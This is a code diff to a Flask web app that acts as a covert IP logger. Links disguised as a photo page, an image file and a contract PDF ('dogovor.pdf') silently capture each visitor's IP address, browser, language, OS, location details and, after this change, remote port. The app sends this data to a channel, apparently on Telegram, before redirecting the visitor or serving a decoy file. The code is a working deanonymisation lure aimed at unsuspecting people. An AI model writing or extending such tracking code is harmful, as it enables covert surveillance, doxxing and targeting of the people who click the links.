@@ -1,5 +1,5 @@
 import requests
-from flask import Flask, redirect, send_from_directory
+from flask import Flask, redirect, send_from_directory, request
 from flask_ipinfo import IPInfo
 
 app: Flask = Flask(__name__)
@@ -20,28 +20,31 @@ def send_to_channel(text: str = None):
     return True
 
 
-def send_user_info():
-    text: str = f"Browser: {ip_info.browser}\nЯзык: {ip_info.lang}\nОС: {ip_info.os}\nIP: {ip_info.ipaddress}\n{ip_info.get_info}"
+def send_user_info(remote_port):
+    text: str = f"Browser: {ip_info.browser}\nЯзык: {ip_info.lang}\nОС: {ip_info.os}\nIP: {ip_info.ipaddress}\n{ip_info.get_info}, PORT: {remote_port}"
     return send_to_channel(text)
 
 
 @app.route('/', methods=['GET'])
 def crib_form():
-    send_user_info()
-    return redirect("https://telegra.ph/Moi-fotki-12-06")
+    remote_port = request.environ.get('REMOTE_PORT')
+    send_user_info(remote_port=remote_port)
+    return redirect("https://t.me/w22wme")
 
 
 @app.route('/image.jpg', methods=['GET'])
 def img_logger():
     uploads = 'logo.png'
-    send_user_info()
+    remote_port = request.environ.get('REMOTE_PORT')
+    send_user_info(remote_port=remote_port)
     return send_from_directory(directory='.', filename=uploads)
 
 
 @app.route('/dogovor.pdf', methods=['GET'])
 def dogovor_logger():
     uploads = 'st-2013-117.pdf'
-    send_user_info()
+    remote_port = request.environ.get('REMOTE_PORT')
+    send_user_info(remote_port=remote_port)
     return send_from_directory(directory='.', filename=uploads)
 
 
